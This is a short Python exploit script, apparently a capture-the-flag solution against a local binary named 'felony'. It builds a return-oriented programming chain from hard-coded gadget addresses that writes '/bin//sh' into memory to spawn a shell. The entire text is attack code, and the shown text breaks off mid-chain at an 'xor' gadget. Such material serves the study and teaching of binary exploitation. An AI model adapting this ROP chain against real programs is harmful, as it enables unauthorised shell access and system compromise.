import _struct

p = remote('127.0.0.1', 10001)
#p = process('./felony')

def house():
	print 'House'
	shellcode = ''
	shellcode += pack('<I', 0x08048FBF ) # pop esi; pop edi; pop ebp; ret; 
	shellcode += 'BBBB'
	shellcode += 'AAAA'
	shellcode += 'CCCC'
	shellcode += '/bin'
	shellcode += pack('<I', 0x08048FBE) # mov dword ptr [edi], esi; ret; 
	shellcode += 'BBBB'
	shellcode += 'AAAA'
	shellcode += 'AAAA'
	shellcode += '//sh'
	shellcode += 'AAAA'
	shellcode += pack('<I', 0x08048FBE) #mov dword ptr [edi], esi; ret; 
	shellcode += 'BBBB'
	shellcode += 'AAAA'
	shellcode += pack('<I', 0x0804918E) # xor
